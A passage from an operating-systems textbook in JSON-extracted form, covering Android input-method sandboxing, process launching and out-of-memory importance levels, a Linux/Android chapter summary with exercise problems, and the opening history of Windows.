person\u0002al data will go through the input-method application, including passwords the user\r\ntypes.\r\nAn application indicates it can be an input method by declaring a service in its\r\nmanifest with an intent filter matching the action for the system’s input-method\r\nprotocol. This does not, however, automatically allow it to become an input meth\u0002od, and unless something else happens the application’s sandbox has no ability to\r\noperate like one.\r\nAndroid’s system settings include a user interface for selecting input methods.\r\nThis interface shows all available input methods of the currently installed applica\u0002tions and whether or not they are enabled. If the user wants to use a new input\r\nmethod after they hav e installed its application, they must go to this system settings\r\ninterface and enable it. When doing that, the system can also inform the user of\r\nthe kinds of things this will allow the application to do.\n844 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nActivity manager in system_server process Camera app process \r\nPicturesProvider\r\nAuthority: \"pics\" \r\nComposeActivity \r\nEmail app process\r\nGranted URls \r\nAllow \r\nCheck \r\nOpen\r\ncontent://pics/1 \r\nReceive\r\ndata\r\nTo: ComposeActivity\r\nURI: content://pics/1 \r\nTask: Pictures \r\nActivityRecord\r\n(PicturePickerActivity) \r\nActivityRecord\r\n(ComposeActivity) \r\nSaved state\r\nRESUMED STOPPED \r\nRECEIVE\r\ncontent://pics/1 GET \r\nFigure 10-66. Adding a picture attachment using a content provider.\r\nEven once an application is enabled as an input method, Android uses fine\u0002grained access-control techniques to limit its impact. For example, only the appli\u0002cation that is being used as the current input method can actually have any special\r\ninteraction; if the user has enabled multiple input methods (such as a soft keyboard\r\nand voice input), only the one that is currently in active use will have those features\r\navailable in its sandbox. Even the current input method is restricted in what it can\r\ndo, through additional policies such as only allowing it to interact with the window\r\nthat currently has input focus."
          },
          "10.8.12 Process Model": {
            "page": 875,
            "content": "10.8.12 Process Model\r\nThe traditional process model in Linux is a fork to create a new process, fol\u0002lowed by an exec to initialize that process with the code to be run and then start its\r\nexecution. The shell is responsible for driving this execution, forking and execut\u0002ing processes as needed to run shell commands. When those commands exit, the\r\nprocess is removed by Linux.\r\nAndroid uses processes somewhat differently. As discussed in the previous\r\nsection on applications, the activity manager is the part of Android responsible for\r\nmanaging running applications. It coordinates the launching of new application\r\nprocesses, determines what will run in them, and when they are no longer needed.\nSEC. 10.8 ANDROID 845\r\nStarting Processes\r\nIn order to launch new processes, the activity manager must communicate with\r\nthe zygote. When the activity manager first starts, it creates a dedicated socket\r\nwith zygote, through which it sends a command when it needs to start a process.\r\nThe command primarily describes the sandbox to be created: the UID that the new\r\nprocess should run as and any other security restrictions that will apply to it.\r\nZygote thus must run as root: when it forks, it does the appropriate setup for the\r\nUID it will run as, finally dropping root privileges and changing the process to the\r\ndesired UID.\r\nRecall in our previous discussion about Android applications that the activity\r\nmanager maintains dynamic information about the execution of activities (in\r\nFig. 10-52), services (Fig. 10-57), broadcasts (to receivers as in Fig. 10-60), and\r\ncontent providers (Fig. 10-61). It uses this information to drive the creation and\r\nmanagement of application processes. For example, when the application launcher\r\ncalls in to the system with a new intent to start an activity as we saw in Fig. 10-52,\r\nit is the activity manager that is responsible for making that new application run.\r\nThe flow for starting an activity in a new process is shown in Fig. 10-67. The\r\ndetails of each step in the illustration are:\r\n1. Some existing process (such as the app launcher) calls in to the activ\u0002ity manager with an intent describing the new activity it would like to\r\nhave started.\r\n2. Activity manager asks the package manager to resolve the intent to an\r\nexplicit component.\r\n3. Activity manager determines that the application’s process is not al\u0002ready running, and then asks zygote for a new process of the ap\u0002propriate UID.\r\n4. Zygote performs a fork, creating a new process that is a clone of itself,\r\ndrops privileges and sets its UID appropriately for the application’s\r\nsandbox, and finishes initialization of Dalvik in that process so that\r\nthe Java runtime is fully executing. For example, it must start threads\r\nlike the garbage collector after it forks.\r\n5. The new process, now a clone of zygote with the Java environment\r\nfully up and running, calls back to the activity manager, asking\r\n‘‘What am I supposed to do?’’\r\n6. Activity manager returns back the full information about the applica\u0002tion it is starting, such as where to find its code.\r\n7. New process loads the code for the application being run.\n846 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\n8. Activity manager sends to the new process any pending operations, in\r\nthis case ‘‘start activity X.’’\r\n9. New process receives the command to start an activity, instantiates the\r\nappropriate Java class, and executes it.\r\nSystem_server process Application process\r\nActivity instance\r\nApplication code\r\nAndroid framework\r\nPackageManagerService\r\nstartActivity()\r\nActivityManagerService\r\n\"Who am I?\"\r\nLoad this app s code\r\nInstantiate this class\r\nCreate a new process\r\nZygote process\r\n2 Resolve Intent\r\n1\r\n3\r\n5\r\n6\r\n8\r\n9\r\n7\r\n4\r\nFigure 10-67. Steps in launching a new application process.\r\nNote that when we started this activity, the application’s process may already\r\nhave been running. In that case, the activity manager will simply skip to the end,\r\nsending a new command to the process telling it to instantiate and run the ap\u0002propriate component. This can result in an additional activity instance running in\r\nthe application, if appropriate, as we saw previously in Fig. 10-56.\r\nProcess Lifecycle\r\nThe activity manager is also responsible for determining when processes are\r\nno longer needed. It keeps track of all activities, receivers, services, and content\r\nproviders running in a process; from this it can determine how important (or not)\r\nthe process is.\r\nRecall that Android’s out-of-memory killer in the kernel uses a process’s\r\noom adj as a strict ordering to determine which processes it should kill first. The\r\nactivity manager is responsible for setting each process’s oom adj appropriately\nSEC. 10.8 ANDROID 847\r\nbased on the state of that process, by classifying them into major categories of use.\r\nFigure 10-68 shows the main categories, with the most important category first.\r\nThe last column shows a typical oom adj value that is assigned to processes of this\r\ntype.\r\nCategor y Description oom adj\r\nSYSTEM The system and daemon processes −16\r\nPERSISTENT Always-r unning application processes −12\r\nFOREGROUND Currently interacting with user 0\r\nVISIBLE Visible to user 1\r\nPERCEPTIBLE Something the user is aware of 2\r\nSERVICE Running background services 3\r\nHOME The home/launcher process 4\r\nCACHED Processes not in use 5\r\nFigure 10-68. Process importance categories.\r\nNow, when RAM is getting low, the system has configured the processes so\r\nthat the out-of-memory killer will first kill cached processes to try to reclaim\r\nenough needed RAM, followed by home, service, and on up. Within a specific\r\noom adj level, it will kill processes with a larger RAM footprint before smaller\r\nones.\r\nWe’v e now seen how Android decides when to start processes and how it cate\u0002gorizes those processes in importance. Now we need to decide when to have proc\u0002esses exit, right? Or do we really need to do anything more here? The answer is,\r\nwe do not. On Android, application processes never cleanly exit. The system just\r\nleaves unneeded processes around, relying on the kernel to reap them as needed.\r\nCached processes in many ways take the place of the swap space that Android\r\nlacks. As RAM is needed elsewhere, cached processes can be thrown out of active\r\nRAM. If an application later needs to run again, a new process can be created,\r\nrestoring any previous state needed to return it to how the user last left it. Behind\r\nthe scenes, the operating system is launching, killing, and relaunching processes as\r\nneeded so the important foreground operations remain running and cached proc\u0002esses are kept around as long as their RAM would not be better used elsewhere.\r\nProcess Dependencies\r\nWe at this point have a good overview of how individual Android processes are\r\nmanaged. There is a further complication to this, however: dependencies between\r\nprocesses.\r\nAs an example, consider our previous camera application holding the pictures\r\nthat have been taken. These pictures are not part of the operating system; they are\n848 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nimplemented by a content provider in the camera application. Other applications\r\nmay want to access that picture data, becoming a client of the camera application.\r\nDependencies between processes can happen with both content providers\r\n(through simple access to the provider) and services (by binding to a service). In\r\neither case, the operating system must keep track of these dependencies and man\u0002age the processes appropriately.\r\nProcess dependencies impact two key things: when processes will be created\r\n(and the components created inside of them), and what the oom adj importance of\r\nthe process will be. Recall that the importance of a process is that of the most im\u0002portant component in it. Its importance is also that of the most important process\r\nthat is dependent on it.\r\nFor example, in the case of the camera application, its process and thus its con\u0002tent provider is not normally running. It will be created when some other process\r\nneeds to access that content provider. While the camera’s content provider is being\r\naccessed, the camera process will be considered at least as important as the process\r\nthat is using it.\r\nTo compute the final importance of every process, the system needs to main\u0002tain a dependency graph between those processes. Each process has a list of all\r\nservices and content providers currently running in it. Each service and content\r\nprovider itself has a list of each process using it. (These lists are maintained in\r\nrecords inside the activity manager, so it is not possible for applications to lie about\r\nthem.) Walking the dependency graph for a process involves walking through all\r\nof its content providers and services and the processes using them.\r\nFigure 10-69 illustrates a typical state processes can be in, taking into account\r\ndependencies between them. This example contains two dependencies, based on\r\nusing a camera-content provider to add a picture attachment to an email as dis\u0002cussed in Fig. 10-66. First is the current foreground email application, which is\r\nmaking use of the camera application to load an attachment. This raises the cam\u0002era process up to the same importance as the email app. Second is a similar situa\u0002tion, the music application is playing music in the background with a service, and\r\nwhile doing so has a dependency on the media process for accessing the user’s mu\u0002sic media.\r\nConsider what happens if the state of Fig. 10-69 changes so that the email ap\u0002plication is done loading the attachment, and no longer uses the camera content\r\nprovider. Figure 10-70 illustrates how the process state will change. Note that the\r\ncamera application is no longer needed, so it has dropped out of the foreground\r\nimportance, and down to the cached level. Making the camera cached has also\r\npushed the old maps application one step down in the cached LRU list.\r\nThese two examples give a final illustration of the importance of cached proc\u0002esses. If the email application again needs to use the camera provider, the pro\u0002vider’s process will typically already be left as a cached process. Using it again is\r\nthen just a matter of setting the process back to the foreground and reconnecting\r\nwith the content provider that is already sitting there with its database initialized.\nSEC."
          }
        }
      },
      "10.9 SUMMARY": {
        "page": 880,
        "content": "10.9 SUMMARY 849\r\nProcess State Impor tance\r\nsystem Core par t of operating system SYSTEM\r\nphone Always running for telephony stack PERSISTENT\r\nemail Current foreground application FOREGROUND\r\ncamera In use by email to load attachment FOREGROUND\r\nmusic Running background service playing music PERCEPTIBLE\r\nmedia In use by music app for accessing user’s music PERCEPTIBLE\r\ndownload Downloading a file for the user SERVICE\r\nlauncher App launcher not current in use HOME\r\nmaps Previously used mapping application CACHED\r\nFigure 10-69. Typical state of process importance\r\nProcess State Impor tance\r\nsystem Core par t of operating system SYSTEM\r\nphone Always running for telephony stack PERSISTENT\r\nemail Current foreground application FOREGROUND\r\nmusic Running background service playing music PERCEPTIBLE\r\nmedia In-use by music app for accessing user’s music PERCEPTIBLE\r\ndownload Downloading a file for the user SERVICE\r\nlauncher App launcher not current in use HOME\r\ncamera Previously used by email CACHED\r\nmaps Previously used mapping application CACHED+1\r\nFigure 10-70. Process state after email stops using camera\r\n10.9 SUMMARY\r\nLinux began its life as an open-source, full-production UNIX clone, and is now\r\nused on machines ranging from smartphones and notebook computers to\r\nsupercomputers. Three main interfaces to it exist: the shell, the C library, and the\r\nsystem calls themselves. In addition, a graphical user interface is often used to sim\u0002plify user interaction with the system. The shell allows users to type commands for\r\nexecution. These may be simple commands, pipelines, or more complex struc\u0002tures. Input and output may be redirected. The C library contains the system calls\r\nand also many enhanced calls, such as printf for writing formatted output to files.\r\nThe actual system call interface is architecture dependent, and on x86 platforms\r\nconsists of roughly 250 calls, each of which does what is needed and no more.\r\nThe key concepts in Linux include the process, the memory model, I/O, and\r\nthe file system. Processes may fork off subprocesses, leading to a tree of processes.\n850 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nProcess management in Linux is different compared to other UNIX systems in that\r\nLinux views each execution entity—a single-threaded process, or each thread with\u0002in a multithreaded process or the kernel—as a distinguishable task. A process, or a\r\nsingle task in general, is then represented via two key components, the task struc\u0002ture and the additional information describing the user address space. The former\r\nis always in memory, but the latter data can be paged in and out of memory. Proc\u0002ess creation is done by duplicating the process task structure, and then setting the\r\nmemory-image information to point to the parent’s memory image. Actual copies\r\nof the memory-image pages are created only if sharing is not allowed and a memo\u0002ry modification is required. This mechanism is called copy on write. Scheduling is\r\ndone using a weighted fair queueing algorithm that uses a red-black tree for the\r\ntasks’ queue management.\r\nThe memory model consists of three segments per process: text, data, and\r\nstack. Memory management is done by paging. An in-memory map keeps track of\r\nthe state of each page, and the page daemon uses a modified dual-hand clock algo\u0002rithm to keep enough free pages around.\r\nI/O devices are accessed using special files, each having a major device num\u0002ber and a minor device number. Block device I/O uses the main memory to cache\r\ndisk blocks and reduce the number of disk accesses. Character I/O can be done in\r\nraw mode, or character streams can be modified via line disciplines. Networking\r\ndevices are treated somewhat differently, by associating entire network protocol\r\nmodules to process the network packets stream to and from the user process.\r\nThe file system is hierarchical with files and directories. All disks are mounted\r\ninto a single directory tree starting at a unique root. Individual files can be linked\r\ninto a directory from elsewhere in the file system. To use a file, it must be first\r\nopened, which yields a file descriptor for use in reading and writing the file. Inter\u0002nally, the file system uses three main tables: the file descriptor table, the\r\nopen-file-description table, and the i-node table. The i-node table is the most im\u0002portant of these, containing all the administrative information about a file and the\r\nlocation of its blocks. Directories and devices are also represented as files, along\r\nwith other special files.\r\nProtection is based on controlling read, write, and execute access for the\r\nowner, group, and others. For directories, the execute bit means search permission.\r\nAndroid is a platform for allowing apps to run on mobile devices. It is based\r\non the Linux kernel, but consists of a large body of software on top of Linux, plus\r\na small number of changes to the Linux kernel. Most of Android is written in Java.\r\nApps are also written in Java, then translated to Java bytecode and then to Dalvik\r\nbytecode. Android apps communicate by a form of protected message passing call\u0002ed transactions. A special Linux kernel model called the Binder handles the IPC.\r\nAndroid packages are self contained and have a manifest desccribing what is in\r\nthe package. Packages contain activities, receivers, content providers, and intents.\r\nThe Android security model is different from the Linux model and carefully sand\u0002boxes each app because all apps are regarded as untrustworthy.\nSEC. 10.9 SUMMARY 851\r\nPROBLEMS\r\n1. Explain how writing UNIX in C made it easier to port it to new machines.\r\n2. The POSIX interface defines a set of library procedures. Explain why POSIX stan\u0002dardizes library procedures instead of the system-call interface.\r\n3. Linux depends on gcc compiler to be ported to new architectures. Describe one advan\u0002tage and one disadvantage of this dependency.\r\n4. A directory contains the following files:\r\naardvark ferret koala porpoise unicorn\r\nbonefish grunion llama quacker vicuna\r\ncapybara hyena marmot rabbit weasel\r\ndingo ibex nuthatch seahorse yak\r\nemu jellyfish ostrich tuna zebu\r\nWhich files will be listed by the command\r\nls [abc]*e*?\r\n5. What does the following Linux shell pipeline do?\r\ngrep nd xyz | wc –l\r\n6. Write a Linux pipeline that prints the eighth line of file z on standard output.\r\n7. Why does Linux distinguish between standard output and standard error, when both\r\ndefault to the terminal?\r\n8. A user at a terminal types the following commands:\r\na|b|c&\r\nd|e|f&\r\nAfter the shell has processed them, how many new processes are running?\r\n9. When the Linux shell starts up a process, it puts copies of its environment variables,\r\nsuch as HOME, on the process’ stack, so the process can find out what its home direc\u0002tory is. If this process should later fork, will the child automatically get these vari\u0002ables, too?\r\n10. About how long does it take a traditional UNIX system to fork off a child process\r\nunder the following conditions: text size = 100 KB, data size = 20 KB, stack size = 10\r\nKB, task structure = 1 KB, user structure = 5 KB. The kernel trap and return takes 1\r\nmsec, and the machine can copy one 32-bit word every 50 nsec. Text segments are\r\nshared, but data and stack segments are not.\r\n11. As multimegabyte programs became more common, the time spent executing the fork\r\nsystem call and copying the data and stack segments of the calling process grew\r\nproportionally. When fork is executed in Linux, the parent’s address space is not cop\u0002ied, as traditional fork semantics would dictate. How does Linux prevent the child from\r\ndoing something that would completely change the fork semantics?\n852 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\n12. Why are negative arguments to nice reserved exclusively for the superuser?\r\n13. A non-real-time Linux process has priority levels from 100 to 139. What is the default\r\nstatic priority and how is the nice value used to change this?\r\n14. Does it make sense to take away a process’ memory when it enters zombie state? Why\r\nor why not?\r\n15. To what hardware concept is a signal closely related? Give two examples of how sig\u0002nals are used.\r\n16. Why do you think the designers of Linux made it impossible for a process to send a\r\nsignal to another process that is not in its process group?\r\n17. A system call is usually implemented using a software interrupt (trap) instruction.\r\nCould an ordinary procedure call be used as well on the Pentium hardware? If so,\r\nunder what conditions and how? If not, why not?\r\n18. In general, do you think daemons have higher or lower priority than interactive proc\u0002esses? Why?\r\n19. When a new process is forked off, it must be assigned a unique integer as its PID. Is it\r\nsufficient to have a counter in the kernel that is incremented on each process creation,\r\nwith the counter used as the new PID? Discuss your answer.\r\n20. In every process’ entry in the task structure, the PID of the parent is stored. Why?\r\n21. The copy-on-write mechanism is used as an optimization in the fork system call, so that\r\na copy of a page is created only when one of the processes (parent or child) tries to\r\nwrite on the page. Suppose a process p1 forks processes p2 and p3 in quick succession.\r\nExplain how a page sharing may be handled in this case.\r\n22. What combination of the sharing flags bits used by the Linux clone command corre\u0002sponds to a conventional UNIX fork call? To creating a conventional UNIX thread?\r\n23. Tw o tasks A and B need to perform the same amount of work. However, task A has\r\nhigher priority, and needs to be given more CPU time. Expain how will this be\r\nachieved in each of the Linux schedulers described in this chapter, the O(1) and the\r\nCFS scheduler.\r\n24. Some UNIX systems are tickless, meaning they do not have periodic clock interrupts.\r\nWhy is this done? Also, does ticklessness make sense on a computer (such as an em\u0002bedded system) running only one process?\r\n25. When booting Linux (or most other operating systems for that matter), the bootstrap\r\nloader in sector 0 of the disk first loads a boot program which then loads the operating\r\nsystem. Why is this extra step necessary? Surely it would be simpler to have the boot\u0002strap loader in sector 0 just load the operating system directly.\r\n26. A certain editor has 100 KB of program text, 30 KB of initialized data, and 50 KB of\r\nBSS. The initial stack is 10 KB. Suppose that three copies of this editor are started si\u0002multaneously. How much physical memory is needed (a) if shared text is used, and (b)\r\nif it is not?\r\n27. Why are open-file-descriptor tables necessary in Linux?\nCHAP. 10 PROBLEMS 853\r\n28. In Linux, the data and stack segments are paged and swapped to a scratch copy kept on\r\na special paging disk or partition, but the text segment uses the executable binary file\r\ninstead. Why?\r\n29. Describe a way to use mmap and signals to construct an interprocess-communication\r\nmechanism.\r\n30. A file is mapped in using the following mmap system call:\r\nmmap(65536, 32768, READ, FLAGS, fd, 0)\r\nPages are 8 KB. Which byte in the file is accessed by reading a byte at memory ad\u0002dress 72,000?\r\n31. After the system call of the previous problem has been executed, the call\r\nmunmap(65536, 8192)\r\nis carried out. Does it succeed? If so, which bytes of the file remain mapped? If not,\r\nwhy does it fail?\r\n32. Can a page fault ever lead to the faulting process being terminated? If so, give an ex\u0002ample. If not, why not?\r\n33. Is it possible that with the buddy system of memory management it ever occurs that\r\ntwo adjacent blocks of free memory of the same size coexist without being merged into\r\none block? If so, explain how. If not, show that it is impossible.\r\n34. It is stated in the text that a paging partition will perform better than a paging file. Why\r\nis this so?\r\n35. Give two examples of the advantages of relative path names over absolute ones.\r\n36. The following locking calls are made by a collection of processes. For each call, tell\r\nwhat happens. If a process fails to get a lock, it blocks.\r\n(a) A wants a shared lock on bytes 0 through 10.\r\n(b) B wants an exclusive lock on bytes 20 through 30.\r\n(c) C wants a shared lock on bytes 8 through 40.\r\n(d) A wants a shared lock on bytes 25 through 35.\r\n(e) B wants an exclusive lock on byte 8.\r\n37. Consider the locked file of Fig. 10-26(c). Suppose that a process tries to lock bytes 10\r\nand 11 and blocks. Then, before C releases its lock, yet another process tries to lock\r\nbytes 10 and 11, and also blocks. What kinds of problems are introduced into the\r\nsemantics by this situation? Propose and defend two solutions.\r\n38. Explain under what situations a process may request a shared lock or an exclusive lock.\r\nWhat problem may a process requesting an exclusive lock suffer from?\r\n39. If a Linux file has protection mode 755 (octal), what can the owner, the owner’s group,\r\nand everyone else do to the file?\r\n40. Some tape drives hav e numbered blocks and the ability to overwrite a particular block\r\nin place without disturbing the blocks in front of or behind it. Could such a device hold\r\na mounted Linux file system?\n854 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\n41. In Fig. 10-24, both Fred and Lisa have access to the file x in their respective directories\r\nafter linking. Is this access completely symmetrical in the sense that anything one of\r\nthem can do with it the other one can, too?\r\n42. As we have seen, absolute path names are looked up starting at the root directory and\r\nrelative path names are looked up starting at the working directory. Suggest an efficient\r\nway to implement both kinds of searches.\r\n43. When the file /usr/ast/work/f is opened, several disk accesses are needed to read i-node\r\nand directory blocks. Calculate the number of disk accesses required under the as\u0002sumption that the i-node for the root directory is always in memory, and all directories\r\nare one block long.\r\n44. A Linux i-node has 12 disk addresses for data blocks, as well as the addresses of sin\u0002gle, double, and triple indirect blocks. If each of these holds 256 disk addresses, what\r\nis the size of the largest file that can be handled, assuming that a disk block is 1 KB?\r\n45. When an i-node is read in from the disk during the process of opening a file, it is put\r\ninto an i-node table in memory. This table has some fields that are not present on the\r\ndisk. One of them is a counter that keeps track of the number of times the i-node has\r\nbeen opened. Why is this field needed?\r\n46. On multi-CPU platforms, Linux maintains a runqueue for each CPU. Is this a good\r\nidea? Explain your answer?\r\n47. The concept of loadable modules is useful in that new device drivers may be loaded in\r\nthe kernel while the system is running. Provide two disadvantages of this concept.\r\n48. Pdflush threads can be awakened periodically to write back to disk very old pages—\r\nolder than 30 sec. Why is this necessary?\r\n49. After a system crash and reboot, a recovery program is usually run. Suppose this pro\u0002gram discovers that the link count in a disk i-node is 2, but only one directory entry\r\nreferences the i-node. Can it fix the problem, and if so, how?\r\n50. Make an educated guess as to which Linux system call is the fastest.\r\n51. Is it possible to unlink a file that has never been linked? What happens?\r\n52. Based on the information presented in this chapter, if a Linux ext2 file system were to\r\nbe put on a 1.44-MB floppy disk, what is the maximum amount of user file data that\r\ncould be stored on the disk? Assume that disk blocks are 1 KB.\r\n53. In view of all the trouble that students can cause if they get to be superuser, why does\r\nthis concept exist in the first place?\r\n54. A professor shares files with his students by placing them in a publicly accessible di\u0002rectory on the Computer Science department’s Linux system. One day he realizes that\r\na file placed there the previous day was left world-writable. He changes the permis\u0002sions and verifies that the file is identical to his master copy. The next day he finds that\r\nthe file has been changed. How could this have happened and how could it have been\r\nprevented?\r\n55. Linux supports a system call fsuid. Unlike setuid, which grants the user all the rights\r\nof the effective id associated with a program he is running, fsuid grants the user who is\nCHAP. 10 PROBLEMS 855\r\nrunning the program special rights only with respect to access to files. Why is this fea\u0002ture useful?\r\n56. On a Linux system, go to /proc/#### directory, where #### is a decimal number cor\u0002responding to a process currently running in the system. Answer the following along\r\nwith an explanation:\r\n(a) What is the size of most of the files in this directory?\r\n(b) What are the time and date settings of most of the files?\r\n(c) What type of access right is provided to the users for accessing the files?\r\n57. If you are writing an Android activity to display a Web page in a browser, how would\r\nyou implement its activity-state saving to minimize the amount of saved state without\r\nlosing anything important?\r\n58. If you are writing networking code on Android that uses a socket to download a file,\r\nwhat should you consider doing that is different than on a standard Linux system?\r\n59. If you are designing something like Android’s zygote process for a system that will\r\nhave multiple threads running in each process forked from it, would you prefer to start\r\nthose threads in zygote or after the fork?\r\n60. Imagine you use Android’s Binder IPC to send an object to another process. You later\r\nreceive an object from a call into your process, and find that what you have received is\r\nthe same object as previously sent. What can you assume or not assume about the cal\u0002ler in your process?\r\n61. Consider an Android system that, immediately after starting, follows these steps:\r\n1. The home (or launcher) application is started.\r\n2. The email application starts syncing its mailbox in the background.\r\n3. The user launches a camera application.\r\n4. The user launches a Web browser application.\r\nThe web page the user is now viewing in the browser application requires inceasingly\r\nmore RAM, until it needs everything it can get. What happens?\r\n62. Write a minimal shell that allows simple commands to be started. It should also allow\r\nthem to be started in the background.\r\n63. Using assembly language and BIOS calls, write a program that boots itself from a flop\u0002py disk on a Pentium-class computer. The program should use BIOS calls to read the\r\nkeyboard and echo the characters typed, just to demonstrate that it is running.\r\n64. Write a dumb terminal program to connect two Linux computers via the serial ports.\r\nUse the POSIX terminal management calls to configure the ports.\r\n65. Write a client-server application which, on request, transfers a large file via sockets.\r\nReimplement the same application using shared memory. Which version do you expect\r\nto perform better? Why? Conduct performance measurements with the code you have\r\nwritten and using different file sizes. What are your observations? What do you think\r\nhappens inside the Linux kernel which results in this behavior?\r\n66. Implement a basic user-level threads library to run on top of Linux. The library API\r\nshould contain function calls like mythreads init, mythreads create, mythreads join,\n856 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nmythreads exit, mythreads yield, mythreads self, and perhaps a few others. Next, im\u0002plement these synchronization variables to enable safe concurrent operations:\r\nmythreads mutex init, mythreads mutex lock, mythreads mutex unlock. Before start\u0002ing, clearly define the API and specify the semantics of each of the calls. Next imple\u0002ment the user-level library with a simple, round-robin preemptive scheduler. You will\r\nalso need to write one or more multithreaded applications, which use your library, in\r\norder to test it. Finally, replace the simple scheduling mechanism with another one\r\nwhich behaves like the Linux 2.6 O(1) scheduler described in this chapter. Compare\r\nthe performance your application(s) receive when using each of the schedulers.\r\n67. Write a shell script that displays some important system information such as what\r\nprocesses you are running, your home directory and current directory, processor type,\r\ncurrent CPU utilization, etc.\n11\r\nCASE STUDY 2: WINDOWS 8\r\nWindows is a modern operating system that runs on consumer PCs, laptops,\r\ntablets and phones as well as business desktop PCs and enterprise servers. Win\u0002dows is also the operating system used in Microsoft’s Xbox gaming system and\r\nAzure cloud computing infrastructure. The most recent version is Windows 8.1.\r\nIn this chapter we will examine various aspects of Windows 8, starting with a brief\r\nhistory, then moving on to its architecture. After this we will look at processes,\r\nmemory management, caching, I/O, the file system, power management, and final\u0002ly, security.\r\n11.1 HISTORY OF WINDOWS THROUGH WINDOWS 8.1\r\nMicrosoft’s dev elopment of the Windows operating system for PC-based com\u0002puters as well as servers can be divided into four eras: MS−DOS, MS−DOS-based\r\nWindows, NT-based Windows, and Modern Windows. Technically, each of\r\nthese systems is substantially different from the others. Each was dominant during\r\ndifferent decades in the history of the personal computer. Figure 11-1 shows the\r\ndates of the major Microsoft operating system releases for desktop computers.\r\nBelow we will briefly sketch each of the eras shown in the table.\r\n857"
      }
    }
  },
  "11 CASE STUDY 2: WINDOWS 8": {
    "page": 888,
    "children": {
      "11.1 HISTORY OF WINDOWS THROUGH WINDOWS 8.1": {
        "page": 888,
        "children": {
          "11.1.1 1980s: MS-DOS": {
            "page": 889,
            "content": "11.1.1 1980s: MS-DOS\r\nIn the early 1980s IBM, at the time the biggest and most powerful computer\r\ncompany in the world, was developing a personal computer based the Intel 8088\r\nmicroprocessor. Since the mid-1970s, Microsoft had become the leading provider\r\nof the BASIC programming language for 8-bit microcomputers based on the 8080\r\nand Z-80. When IBM approached Microsoft about licensing BASIC for the new\r\nIBM PC, Microsoft readily agreed and suggested that IBM contact Digital Re\u0002search to license its CP/M operating system, since Microsoft was not then in the\r\noperating system business. IBM did that, but the president of Digital Research,\r\nGary Kildall, was too busy to meet with IBM. This was probably the worst blun\u0002der in all of business history, since had he licensed CP/M to IBM, Kildall would\r\nprobably have become the richest man on the planet. Rebuffed by Kildall, IBM\r\ncame back to Bill Gates, the cofounder of Microsoft, and asked for help again.\r\nWithin a short time, Microsoft bought a CP/M clone from a local company, Seattle\r\nComputer Products, ported it to the IBM PC, and licensed it to IBM. It was then\r\nrenamed MS-DOS 1.0 (MicroSoft Disk Operating System) and shipped with the\r\nfirst IBM PC in 1981.\nSEC. 11.1 HISTORY OF WINDOWS THROUGH WINDOWS 8.1 859\r\nMS-DOS was a 16-bit real-mode, single-user, command-line-oriented operat\u0002ing system consisting of 8 KB of memory resident code. Over the next decade,\r\nboth the PC and MS-DOS continued to evolve, adding more features and capabili\u0002ties. By 1986, when IBM built the PC/AT based on the Intel 286, MS-DOS had\r\ngrown to be 36 KB, but it continued to be a command-line-oriented, one-applica\u0002tion-ata-time, operating system."
          },
          "11.1.2 1990s: MS-DOS-based Windows": {
            "page": 890,
            "content": "11.1.2 1990s: MS-DOS-based Windows\r\nInspired by the graphical user interface of a system developed by Doug Engel\u0002bart at Stanford Research Institute and later improved at Xerox PARC, and their\r\ncommercial progeny, the Apple Lisa and the Apple Macintosh, Microsoft decided\r\nto give MS-DOS a graphical user interface that it called Windows. The first two\r\nversions of Windows (1985 and 1987) were not very successful, due in part to the\r\nlimitations of the PC hardware available at the time. In 1990 Microsoft released\r\nWindows 3.0 for the Intel 386, and sold over one million copies in six months.\r\nWindows 3.0 was not a true operating system, but a graphical environment\r\nbuilt on top of MS-DOS, which was still in control of the machine and the file sys\u0002tem. All programs ran in the same address space and a bug in any one of them\r\ncould bring the whole system to a frustrating halt.\r\nIn August 1995, Windows 95 was released. It contained many of the features\r\nof a full-blown operating system, including virtual memory, process management,\r\nand multiprogramming, and introduced 32-bit programming interfaces. However,\r\nit still lacked security, and provided poor isolation between applications and the\r\noperating system. Thus, the problems with instability continued, even with the\r\nsubsequent releases of Windows 98 and Windows Me, where MS-DOS was still\r\nthere running 16-bit assembly code in the heart of the Windows operating system."
          },
          "11.1.3 2000s: NT-based Windows": {
            "page": 890,
            "content": "11.1.3 2000s: NT-based Windows\r\nBy end of the 1980s, Microsoft realized that continuing to evolve an operating\r\nsystem with MS-DOS at its center was not the best way to go. PC hardware was\r\ncontinuing to increase in speed and capability and ultimately the PC market would\r\ncollide with the desktop, workstation, and enterprise-server computing markets,\r\nwhere UNIX was the dominant operating system. Microsoft was also concerned\r\nthat the Intel microprocessor family might not continue to be competitive, as it was\r\nalready being challenged by RISC architectures. To address these issues, Micro\u0002soft recruited a group of engineers from DEC (Digital Equipment Corporation) led\r\nby Dave Cutler, one of the key designers of DEC’s VMS operating system (among\r\nothers). Cutler was chartered to develop a brand-new 32-bit operating system that\r\nwas intended to implement OS/2, the operating system API that Microsoft was\r\njointly developing with IBM at the time. The original design documents by Cut\u0002ler’s team called the system NT OS/2.\n860 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nCutler’s system was called NT for New Technology (and also because the orig\u0002inal target processor was the new Intel 860, code-named the N10). NT was de\u0002signed to be portable across different processors and emphasized security and\r\nreliability, as well as compatibility with the MS-DOS-based versions of Windows.\r\nCutler’s background at DEC shows in various places, with there being more than a\r\npassing similarity between the design of NT and that of VMS and other operating\r\nsystems designed by Cutler, shown in Fig. 11-2.\r\nYear DEC operating system Characteristics\r\n1973 RSX-11M 16-bit, multiuser, real-time, swapping\r\n1978 VAX/VMS 32-bit, vir tual memor y\r\n1987 VAXELAN Real-time\r\n1988 PRISM/Mica Canceled in favor of MIPS/Ultrix\r\nFigure 11-2. DEC operating systems developed by Dave Cutler.\r\nProgrammers familiar only with UNIX find the architecture of NT to be quite\r\ndifferent. This is not just because of the influence of VMS, but also because of the\r\ndifferences in the computer systems that were common at the time of design.\r\nUNIX was first designed in the 1970s for single-processor, 16-bit, tiny-memory,\r\nswapping systems where the process was the unit of concurrency and composition,\r\nand fork/exec were inexpensive operations (since swapping systems frequently\r\ncopy processes to disk anyway). NT was designed in the early 1990s, 